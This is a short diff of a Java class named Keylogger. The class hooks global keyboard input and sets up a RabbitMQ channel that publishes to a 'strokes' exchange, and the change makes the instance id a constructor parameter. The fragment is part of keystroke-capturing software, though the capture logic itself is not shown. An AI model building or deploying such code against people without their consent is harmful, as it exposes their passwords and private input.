@@ -14,11 +14,12 @@ import com.rabbitmq.client.ConnectionFactory;
 
 public class Keylogger implements NativeKeyListener{
   private final String EXCHANGE_NAME = "strokes";
-  private final int id = 3;
+  private final Long id;
   private final Logger logger = LoggerFactory.getLogger(Keylogger.class);
   private Channel channel; 
 
-  public Keylogger() throws Exception{
+  public Keylogger(Long id) throws Exception{
+    this.id = id;
     ConnectionFactory factory = new ConnectionFactory();
     Connection connection = factory.newConnection();
     factory.setHost("localhost");
